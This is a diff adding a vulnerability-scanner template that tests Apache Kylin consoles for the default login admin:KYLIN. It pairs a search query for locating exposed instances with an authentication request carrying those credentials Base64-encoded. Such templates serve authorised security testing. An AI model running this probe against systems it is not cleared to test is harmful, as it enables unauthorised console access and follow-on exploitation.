@@ -1,0 +1,21 @@
+name: Apache Kylin Console 控制台弱口令
+manual: true
+query: app="APACHE-kylin"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /kylin/api/user/authentication
+      headers:
+        Authorization: Basic YWRtaW46S1lMSU4=
+        Cookie: project=null
+      follow_redirects: true
+    expression: response.status == 200 && response.status != 401
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: Apache Kylin Console 控制台存在默认弱口令 admin：KYLIN，可被登录控制台进一步利用其他漏洞
+  tags: 弱口令
